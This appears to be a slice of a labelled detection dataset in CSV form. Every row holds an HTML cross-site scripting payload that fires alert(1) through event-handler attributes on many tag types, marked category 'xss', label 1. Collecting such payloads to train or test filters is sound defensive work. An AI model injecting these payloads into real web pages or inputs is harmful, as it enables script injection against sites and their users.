index,input,category,labels
6176,"<html onblur=alert(1) tabindex=1 id=x></html><input autofocus>
",xss,1
6177,"<html onclick=""alert(1)"">test</html>
",xss,1
6178,"<html oncontextmenu=""alert(1)"">test</html>
",xss,1
6179,"<html oncopy=""alert(1)"" contenteditable>test</html>
",xss,1
6180,"<html oncut=""alert(1)"" contenteditable>test</html>
",xss,1
6181,"<html ondblclick=""alert(1)"">test</html>
",xss,1
6182,"<html onfocusout=alert(1) tabindex=1 id=x></html><input autofocus>
",xss,1
6183,"<html onkeydown=""alert(1)"" contenteditable>test</html>
",xss,1
6184,"<html onkeypress=""alert(1)"" contenteditable>test</html>
",xss,1
6185,"<html onkeyup=""alert(1)"" contenteditable>test</html>
",xss,1
6186,"<html onmousedown=""alert(1)"">test</html>
",xss,1
6187,"<html onmouseenter=""alert(1)"">test</html>
",xss,1
6188,"<html onmouseleave=""alert(1)"">test</html>
",xss,1
6189,"<html onmousemove=""alert(1)"">test</html>
",xss,1
6190,"<html onmouseout=""alert(1)"">test</html>
",xss,1
6191,"<html onmouseover=""alert(1)"">test</html>
",xss,1
6192,"<html onmouseup=""alert(1)"">test</html>
",xss,1
6193,"<html onpaste=""alert(1)"" contenteditable>test</html>
",xss,1
6194,"<i draggable=""true"" ondrag=""alert(1)"">test</i>
",xss,1
6195,"<i draggable=""true"" ondragend=""alert(1)"">test</i>
",xss,1
6196,"<i draggable=""true"" ondragenter=""alert(1)"">test</i>
",xss,1
6197,"<i draggable=""true"" ondragleave=""alert(1)"">test</i>
",xss,1
6198,"<i draggable=""true"" ondragstart=""alert(1)"">test</i>
",xss,1
6199,"<i id=x tabindex=1 onactivate=alert(1)></i>
",xss,1
6200,"<i id=x tabindex=1 onbeforeactivate=alert(1)></i>
",xss,1
6201,"<i id=x tabindex=1 onbeforedeactivate=alert(1)></i><input autofocus>
",xss,1
6202,"<i id=x tabindex=1 ondeactivate=alert(1)></i><input id=y autofocus>
",xss,1
6203,"<i id=x tabindex=1 onfocus=alert(1)></i>
",xss,1
6204,"<i id=x tabindex=1 onfocusin=alert(1)></i>
",xss,1
6205,"<i onbeforecopy=""alert(1)"" contenteditable>test</i>
",xss,1
6206,"<i onbeforecut=""alert(1)"" contenteditable>test</i>
",xss,1
6207,"<i onbeforepaste=""alert(1)"" contenteditable>test</i>
",xss,1
6208,"<i onblur=alert(1) tabindex=1 id=x></i><input autofocus>
",xss,1
6209,"<i onclick=""alert(1)"">test</i>
",xss,1
6210,"<i oncontextmenu=""alert(1)"">test</i>
",xss,1
6211,"<i oncopy=""alert(1)"" contenteditable>test</i>
",xss,1
6212,"<i oncut=""alert(1)"" contenteditable>test</i>
",xss,1
6213,"<i ondblclick=""alert(1)"">test</i>
",xss,1
6214,"<i onfocusout=alert(1) tabindex=1 id=x></i><input autofocus>
",xss,1
6215,"<i onkeydown=""alert(1)"" contenteditable>test</i>
",xss,1
6216,"<i onkeypress=""alert(1)"" contenteditable>test</i>
",xss,1
6217,"<i onkeyup=""alert(1)"" contenteditable>test</i>
",xss,1
6218,"<i onmousedown=""alert(1)"">test</i>
",xss,1
6219,"<i onmouseenter=""alert(1)"">test</i>
",xss,1
6220,"<i onmouseleave=""alert(1)"">test</i>
",xss,1
6221,"<i onmousemove=""alert(1)"">test</i>
",xss,1
6222,"<i onmouseout=""alert(1)"">test</i>
",xss,1
6223,"<i onmouseover=""alert(1)"">test</i>
",xss,1
6224,"<i onmouseup=""alert(1)"">test</i>
",xss,1
6225,"<i onpaste=""alert(1)"" contenteditable>test</i>
",xss,1
6226,"<iframe draggable=""true"" ondrag=""alert(1)"">test</iframe>
",xss,1
6227,"<iframe draggable=""true"" ondragend=""alert(1)"">test</iframe>
",xss,1
6228,"<iframe draggable=""true"" ondragenter=""alert(1)"">test</iframe>
",xss,1
6229,"<iframe draggable=""true"" ondragleave=""alert(1)"">test</iframe>
",xss,1
6230,"<iframe draggable=""true"" ondragstart=""alert(1)"">test</iframe>
",xss,1
6231,"<iframe id=x onfocus=alert(1)>
",xss,1
6232,"<iframe id=x onfocusin=alert(1)>
",xss,1
6233,"<iframe id=x tabindex=1 onactivate=alert(1)></iframe>
",xss,1
6234,"<iframe id=x tabindex=1 onbeforeactivate=alert(1)></iframe>
",xss,1
6235,"<iframe id=x tabindex=1 onbeforedeactivate=alert(1)></iframe><input autofocus>
",xss,1
6236,"<iframe id=x tabindex=1 ondeactivate=alert(1)></iframe><input id=y autofocus>
",xss,1
6237,"<iframe onbeforecopy=""alert(1)"" contenteditable>test</iframe>
",xss,1
6238,"<iframe onbeforecut=""alert(1)"" contenteditable>test</iframe>
",xss,1
6239,"<iframe onbeforepaste=""alert(1)"" contenteditable>test</iframe>
",xss,1
6240,"<iframe onblur=alert(1) id=x><input autofocus>
",xss,1
6241,"<iframe onclick=""alert(1)"">test</iframe>
",xss,1
6242,"<iframe oncontextmenu=""alert(1)"">test</iframe>
",xss,1
6243,"<iframe oncopy=""alert(1)"" contenteditable>test</iframe>
",xss,1
6244,"<iframe oncut=""alert(1)"" contenteditable>test</iframe>
",xss,1
6245,"<iframe ondblclick=""alert(1)"">test</iframe>
",xss,1
6246,"<iframe onfocusout=alert(1) id=x><input autofocus>
",xss,1
6247,"<iframe onkeydown=""alert(1)"" contenteditable>test</iframe>
",xss,1
6248,"<iframe onkeypress=""alert(1)"" contenteditable>test</iframe>
",xss,1
6249,"<iframe onkeyup=""alert(1)"" contenteditable>test</iframe>
",xss,1
6250,"<iframe onload=alert(1)></iframe>
",xss,1
6251,"<iframe onmousedown=""alert(1)"">test</iframe>
",xss,1
6252,"<iframe onmouseenter=""alert(1)"">test</iframe>
",xss,1
6253,"<iframe onmouseleave=""alert(1)"">test</iframe>
",xss,1
6254,"<iframe onmousemove=""alert(1)"">test</iframe>
",xss,1
6255,"<iframe onmouseout=""alert(1)"">test</iframe>
",xss,1
6256,"<iframe onmouseover=""alert(1)"">test</iframe>
",xss,1
6257,"<iframe onmouseup=""alert(1)"">test</iframe>
",xss,1
6258,"<iframe onpaste=""alert(1)"" contenteditable>test</iframe>
",xss,1
6259,"<iframe onreadystatechange=alert(1)></iframe>
",xss,1
6260,"<image draggable=""true"" ondrag=""alert(1)"">test</image>
",xss,1
6261,"<image draggable=""true"" ondragend=""alert(1)"">test</image>
",xss,1
6262,"<image draggable=""true"" ondragenter=""alert(1)"">test</image>
",xss,1
6263,"<image draggable=""true"" ondragleave=""alert(1)"">test</image>
",xss,1
6264,"<image draggable=""true"" ondragstart=""alert(1)"">test</image>
",xss,1
6265,"<image id=x tabindex=1 onactivate=alert(1)></image>
",xss,1
6266,"<image id=x tabindex=1 onbeforeactivate=alert(1)></image>
",xss,1
6267,"<image id=x tabindex=1 onbeforedeactivate=alert(1)></image><input autofocus>
",xss,1
6268,"<image id=x tabindex=1 ondeactivate=alert(1)></image><input id=y autofocus>
",xss,1
6269,"<image id=x tabindex=1 onfocus=alert(1)></image>
",xss,1
6270,"<image id=x tabindex=1 onfocusin=alert(1)></image>
",xss,1
6271,"<image onbeforecopy=""alert(1)"" contenteditable>test</image>
",xss,1
6272,"<image onbeforecut=""alert(1)"" contenteditable>test</image>
",xss,1
6273,"<image onbeforepaste=""alert(1)"" contenteditable>test</image>
",xss,1
6274,"<image onblur=alert(1) tabindex=1 id=x></image><input autofocus>
",xss,1
6275,"<image onclick=""alert(1)"">test</image>
",xss,1
6276,"<image oncontextmenu=""alert(1)"">test</image>
",xss,1
6277,"<image oncopy=""alert(1)"" contenteditable>test</image>
",xss,1
6278,"<image oncut=""alert(1)"" contenteditable>test</image>
",xss,1
6279,"<image ondblclick=""alert(1)"">test</image>
",xss,1
6280,"<image onfocusout=alert(1) tabindex=1 id=x></image><input autofocus>
",xss,1
6281,"<image onkeydown=""alert(1)"" contenteditable>test</image>
",xss,1
6282,"<image onkeypress=""alert(1)"" contenteditable>test</image>
",xss,1
6283,"<image onkeyup=""alert(1)"" contenteditable>test</image>
",xss,1
6284,"<image onmousedown=""alert(1)"">test</image>
",xss,1
6285,"<image onmouseenter=""alert(1)"">test</image>
",xss,1
6286,"<image onmouseleave=""alert(1)"">test</image>
",xss,1
6287,"<image onmousemove=""alert(1)"">test</image>
",xss,1
6288,"<image onmouseout=""alert(1)"">test</image>
",xss,1
6289,"<image onmouseover=""alert(1)"">test</image>
",xss,1
6290,"<image onmouseup=""alert(1)"">test</image>
",xss,1
6291,"<image onpaste=""alert(1)"" contenteditable>test</image>
",xss,1
6292,"<image src/onerror=alert(1)>
",xss,1
6293,"<image src=validimage.png onload=alert(1)>
",xss,1
6294,"<image src=validimage.png onloadend=alert(1)>
",xss,1
6295,"<image src=validimage.png onloadstart=alert(1)>
",xss,1
6296,"<image srcset=1 onerror=alert(1)>
",xss,1
6297,"<img draggable=""true"" ondrag=""alert(1)"">test</img>
",xss,1
6298,"<img draggable=""true"" ondragend=""alert(1)"">test</img>
",xss,1
6299,"<img draggable=""true"" ondragenter=""alert(1)"">test</img>
",xss,1
6300,"<img draggable=""true"" ondragleave=""alert(1)"">test</img>
",xss,1
6301,"<img draggable=""true"" ondragstart=""alert(1)"">test</img>
",xss,1
6302,"<img id=x tabindex=1 onactivate=alert(1)></img>
",xss,1
6303,"<img id=x tabindex=1 onbeforeactivate=alert(1)></img>
",xss,1
6304,"<img id=x tabindex=1 onbeforedeactivate=alert(1)></img><input autofocus>
",xss,1
6305,"<img id=x tabindex=1 ondeactivate=alert(1)></img><input id=y autofocus>
",xss,1
6306,"<img id=x tabindex=1 onfocus=alert(1)></img>
",xss,1
6307,"<img id=x tabindex=1 onfocusin=alert(1)></img>
",xss,1
6308,"<img onbeforecopy=""alert(1)"" contenteditable>test</img>
",xss,1
6309,"<img onbeforecut=""alert(1)"" contenteditable>test</img>
",xss,1
6310,"<img onbeforepaste=""alert(1)"" contenteditable>test</img>
",xss,1
6311,"<img onblur=alert(1) tabindex=1 id=x></img><input autofocus>
",xss,1
6312,"<img onclick=""alert(1)"">test</img>
",xss,1
6313,"<img oncontextmenu=""alert(1)"">test</img>
",xss,1
6314,"<img oncopy=""alert(1)"" contenteditable>test</img>
",xss,1
6315,"<img oncut=""alert(1)"" contenteditable>test</img>
",xss,1
6316,"<img ondblclick=""alert(1)"">test</img>
",xss,1
6317,"<img onfocusout=alert(1) tabindex=1 id=x></img><input autofocus>
",xss,1
6318,"<img onkeydown=""alert(1)"" contenteditable>test</img>
",xss,1
6319,"<img onkeypress=""alert(1)"" contenteditable>test</img>
",xss,1
6320,"<img onkeyup=""alert(1)"" contenteditable>test</img>
",xss,1
6321,"<img onmousedown=""alert(1)"">test</img>
",xss,1
6322,"<img onmouseenter=""alert(1)"">test</img>
",xss,1
6323,"<img onmouseleave=""alert(1)"">test</img>
",xss,1
6324,"<img onmousemove=""alert(1)"">test</img>
",xss,1
6325,"<img onmouseout=""alert(1)"">test</img>
",xss,1
6326,"<img onmouseover=""alert(1)"">test</img>
",xss,1
6327,"<img onmouseup=""alert(1)"">test</img>
",xss,1
6328,"<img onpaste=""alert(1)"" contenteditable>test</img>
",xss,1
6329,"<img src/onerror=alert(1)>
",xss,1
6330,"<img src=validimage.png onload=alert(1)>
",xss,1
6331,"<img src=validimage.png onloadend=alert(1)>
",xss,1
6332,"<img src=validimage.png onloadstart=alert(1)>
",xss,1
6333,"<img srcset=1 onerror=alert(1)>
",xss,1
6334,"<img srcset=validimage.png onload=alert(1)>
",xss,1
6335,"<img usemap=#x><map name=""x""><area href onfocus=alert(1) id=x>
",xss,1
6336,"<img usemap=#x><map name=""x""><area href onfocusin=alert(1) id=x>
",xss,1
6337,"<input autofocus onfocus=alert(1)>
",xss,1
6338,"<input autofocus onfocusin=alert(1)>
",xss,1
6339,"<input draggable=""true"" ondrag=""alert(1)"">test</input>
",xss,1
6340,"<input draggable=""true"" ondragend=""alert(1)"">test</input>
",xss,1
6341,"<input draggable=""true"" ondragenter=""alert(1)"">test</input>
",xss,1
6342,"<input draggable=""true"" ondragleave=""alert(1)"">test</input>
",xss,1
6343,"<input draggable=""true"" ondragstart=""alert(1)"">test</input>
",xss,1
6344,"<input id=x onfocus=alert(1)>
",xss,1
6345,"<input id=x onfocusin=alert(1)>
",xss,1
6346,"<input id=x tabindex=1 onactivate=alert(1)></input>
",xss,1
6347,"<input id=x tabindex=1 onbeforeactivate=alert(1)></input>
",xss,1
6348,"<input id=x tabindex=1 onbeforedeactivate=alert(1)></input><input autofocus>
",xss,1
6349,"<input id=x tabindex=1 ondeactivate=alert(1)></input><input id=y autofocus>
",xss,1
6350,"<input onauxclick=alert(1)>
",xss,1
6351,"<input onbeforecopy=alert(1) value=""XSS"" autofocus>
",xss,1
6352,"<input onbeforecut=alert(1) value=""XSS"" autofocus>
",xss,1
6353,"<input onbeforepaste=alert(1) value="""" autofocus>
",xss,1
6354,"<input onblur=alert(1) id=x><input autofocus>
",xss,1
6355,"<input onchange=alert(1) value=xss>
",xss,1
6356,"<input onclick=""alert(1)"">test</input>
",xss,1
6357,"<input oncontextmenu=""alert(1)"">test</input>
",xss,1
6358,"<input oncopy=alert(1) value=""XSS"" autofocus>
",xss,1
6359,"<input oncut=alert(1) value=""XSS"" autofocus>
",xss,1
6360,"<input ondblclick=""alert(1)"">test</input>
",xss,1
6361,"<input onfocusout=alert(1) id=x><input autofocus>
",xss,1
6362,"<input oninput=alert(1) value=xss>
",xss,1
6363,"<input onkeydown=""alert(1)"" contenteditable>test</input>
",xss,1
6364,"<input onkeypress=""alert(1)"" contenteditable>test</input>
",xss,1
6365,"<input onkeyup=""alert(1)"" contenteditable>test</input>
",xss,1
6366,"<input onmousedown=""alert(1)"">test</input>
",xss,1
6367,"<input onmouseenter=""alert(1)"">test</input>
",xss,1
6368,"<input onmouseleave=""alert(1)"">test</input>
",xss,1
6369,"<input onmousemove=""alert(1)"">test</input>
",xss,1
6370,"<input onmouseout=""alert(1)"">test</input>
",xss,1
6371,"<input onmouseover=""alert(1)"">test</input>
",xss,1
6372,"<input onmouseup=""alert(1)"">test</input>
",xss,1
6373,"<input onpaste=alert(1) value="""" autofocus>
",xss,1
6374,"<input onselect=alert(1) value=""XSS"" autofocus>
",xss,1
6375,"<input type=checkbox id=x onfocus=alert(1)>
",xss,1
6376,"<input type=checkbox id=x onfocusin=alert(1)>
",xss,1
6377,"<input type=image onloadend=alert(1) src=validimage.png>
",xss,1
6378,"<input type=image onloadstart=alert(1) src=validimage.png>
",xss,1
6379,"<input type=image src=1 onerror=alert(1)>
",xss,1
6380,"<input type=image src=validimage.png onload=alert(1)>
",xss,1
6381,"<input type=radio id=x onfocus=alert(1)>
",xss,1
6382,"<input type=radio id=x onfocusin=alert(1)>
",xss,1
6383,"<ins draggable=""true"" ondrag=""alert(1)"">test</ins>
",xss,1
6384,"<ins draggable=""true"" ondragend=""alert(1)"">test</ins>
",xss,1
6385,"<ins draggable=""true"" ondragenter=""alert(1)"">test</ins>
",xss,1
6386,"<ins draggable=""true"" ondragleave=""alert(1)"">test</ins>
",xss,1
6387,"<ins draggable=""true"" ondragstart=""alert(1)"">test</ins>
",xss,1
6388,"<ins id=x tabindex=1 onactivate=alert(1)></ins>
",xss,1
6389,"<ins id=x tabindex=1 onbeforeactivate=alert(1)></ins>
",xss,1
6390,"<ins id=x tabindex=1 onbeforedeactivate=alert(1)></ins><input autofocus>
",xss,1
6391,"<ins id=x tabindex=1 ondeactivate=alert(1)></ins><input id=y autofocus>
",xss,1
6392,"<ins id=x tabindex=1 onfocus=alert(1)></ins>
",xss,1
6393,"<ins id=x tabindex=1 onfocusin=alert(1)></ins>
",xss,1
6394,"<ins onbeforecopy=""alert(1)"" contenteditable>test</ins>
",xss,1
6395,"<ins onbeforecut=""alert(1)"" contenteditable>test</ins>
",xss,1
6396,"<ins onbeforepaste=""alert(1)"" contenteditable>test</ins>
",xss,1
6397,"<ins onblur=alert(1) tabindex=1 id=x></ins><input autofocus>
",xss,1
6398,"<ins onclick=""alert(1)"">test</ins>
",xss,1
6399,"<ins oncontextmenu=""alert(1)"">test</ins>
",xss,1
6400,"<ins oncopy=""alert(1)"" contenteditable>test</ins>
",xss,1
6401,"<ins oncut=""alert(1)"" contenteditable>test</ins>
",xss,1
6402,"<ins ondblclick=""alert(1)"">test</ins>
",xss,1
6403,"<ins onfocusout=alert(1) tabindex=1 id=x></ins><input autofocus>
",xss,1
6404,"<ins onkeydown=""alert(1)"" contenteditable>test</ins>
",xss,1
6405,"<ins onkeypress=""alert(1)"" contenteditable>test</ins>
",xss,1
6406,"<ins onkeyup=""alert(1)"" contenteditable>test</ins>
",xss,1
6407,"<ins onmousedown=""alert(1)"">test</ins>
",xss,1
6408,"<ins onmouseenter=""alert(1)"">test</ins>
",xss,1
6409,"<ins onmouseleave=""alert(1)"">test</ins>
",xss,1
6410,"<ins onmousemove=""alert(1)"">test</ins>
",xss,1
6411,"<ins onmouseout=""alert(1)"">test</ins>
",xss,1
6412,"<ins onmouseover=""alert(1)"">test</ins>
",xss,1
6413,"<ins onmouseup=""alert(1)"">test</ins>
",xss,1
6414,"<ins onpaste=""alert(1)"" contenteditable>test</ins>
",xss,1
6415,"<isindex draggable=""true"" ondrag=""alert(1)"">test</isindex>
",xss,1
6416,"<isindex draggable=""true"" ondragend=""alert(1)"">test</isindex>
",xss,1
6417,"<isindex draggable=""true"" ondragenter=""alert(1)"">test</isindex>
",xss,1
6418,"<isindex draggable=""true"" ondragleave=""alert(1)"">test</isindex>
",xss,1
6419,"<isindex draggable=""true"" ondragstart=""alert(1)"">test</isindex>
",xss,1
6420,"<isindex id=x tabindex=1 onactivate=alert(1)></isindex>
",xss,1
6421,"<isindex id=x tabindex=1 onbeforeactivate=alert(1)></isindex>
",xss,1
6422,"<isindex id=x tabindex=1 onbeforedeactivate=alert(1)></isindex><input autofocus>
",xss,1
6423,"<isindex id=x tabindex=1 ondeactivate=alert(1)></isindex><input id=y autofocus>
",xss,1
6424,"<isindex id=x tabindex=1 onfocus=alert(1)></isindex>
",xss,1
6425,"<isindex id=x tabindex=1 onfocusin=alert(1)></isindex>
",xss,1
6426,"<isindex onbeforecopy=""alert(1)"" contenteditable>test</isindex>
",xss,1
6427,"<isindex onbeforecut=""alert(1)"" contenteditable>test</isindex>
",xss,1
6428,"<isindex onbeforepaste=""alert(1)"" contenteditable>test</isindex>
",xss,1
6429,"<isindex onblur=alert(1) tabindex=1 id=x></isindex><input autofocus>
",xss,1
6430,"<isindex onclick=""alert(1)"">test</isindex>
",xss,1
6431,"<isindex oncontextmenu=""alert(1)"">test</isindex>
",xss,1
6432,"<isindex oncopy=""alert(1)"" contenteditable>test</isindex>
",xss,1
6433,"<isindex oncut=""alert(1)"" contenteditable>test</isindex>
",xss,1
6434,"<isindex ondblclick=""alert(1)"">test</isindex>
",xss,1
6435,"<isindex onfocusout=alert(1) tabindex=1 id=x></isindex><input autofocus>
",xss,1
6436,"<isindex onkeydown=""alert(1)"" contenteditable>test</isindex>
",xss,1
6437,"<isindex onkeypress=""alert(1)"" contenteditable>test</isindex>
",xss,1
6438,"<isindex onkeyup=""alert(1)"" contenteditable>test</isindex>
",xss,1
6439,"<isindex onmousedown=""alert(1)"">test</isindex>
",xss,1
6440,"<isindex onmouseenter=""alert(1)"">test</isindex>
",xss,1
6441,"<isindex onmouseleave=""alert(1)"">test</isindex>
",xss,1
6442,"<isindex onmousemove=""alert(1)"">test</isindex>
",xss,1
6443,"<isindex onmouseout=""alert(1)"">test</isindex>
",xss,1
6444,"<isindex onmouseover=""alert(1)"">test</isindex>
",xss,1
6445,"<isindex onmouseup=""alert(1)"">test</isindex>
",xss,1
6446,"<isindex onpaste=""alert(1)"" contenteditable>test</isindex>
",xss,1
6447,"<isindex type=image onload=alert(1) src=validimage.png>
",xss,1
6448,"<isindex type=image src=1 onerror=alert(1)>
",xss,1
6449,"<kbd draggable=""true"" ondrag=""alert(1)"">test</kbd>
",xss,1
6450,"<kbd draggable=""true"" ondragend=""alert(1)"">test</kbd>
",xss,1
6451,"<kbd draggable=""true"" ondragenter=""alert(1)"">test</kbd>
",xss,1
6452,"<kbd draggable=""true"" ondragleave=""alert(1)"">test</kbd>
",xss,1
6453,"<kbd draggable=""true"" ondragstart=""alert(1)"">test</kbd>
",xss,1
6454,"<kbd id=x tabindex=1 onactivate=alert(1)></kbd>
",xss,1
6455,"<kbd id=x tabindex=1 onbeforeactivate=alert(1)></kbd>
",xss,1
6456,"<kbd id=x tabindex=1 onbeforedeactivate=alert(1)></kbd><input autofocus>
",xss,1
6457,"<kbd id=x tabindex=1 ondeactivate=alert(1)></kbd><input id=y autofocus>
",xss,1
6458,"<kbd id=x tabindex=1 onfocus=alert(1)></kbd>
",xss,1
6459,"<kbd id=x tabindex=1 onfocusin=alert(1)></kbd>
",xss,1
6460,"<kbd onbeforecopy=""alert(1)"" contenteditable>test</kbd>
",xss,1
6461,"<kbd onbeforecut=""alert(1)"" contenteditable>test</kbd>
",xss,1
6462,"<kbd onbeforepaste=""alert(1)"" contenteditable>test</kbd>
",xss,1
6463,"<kbd onblur=alert(1) tabindex=1 id=x></kbd><input autofocus>
",xss,1
6464,"<kbd onclick=""alert(1)"">test</kbd>
",xss,1
6465,"<kbd oncontextmenu=""alert(1)"">test</kbd>
",xss,1
6466,"<kbd oncopy=""alert(1)"" contenteditable>test</kbd>
",xss,1
6467,"<kbd oncut=""alert(1)"" contenteditable>test</kbd>
",xss,1
6468,"<kbd ondblclick=""alert(1)"">test</kbd>
",xss,1
6469,"<kbd onfocusout=alert(1) tabindex=1 id=x></kbd><input autofocus>
",xss,1
6470,"<kbd onkeydown=""alert(1)"" contenteditable>test</kbd>
",xss,1
6471,"<kbd onkeypress=""alert(1)"" contenteditable>test</kbd>
",xss,1
6472,"<kbd onkeyup=""alert(1)"" contenteditable>test</kbd>
",xss,1
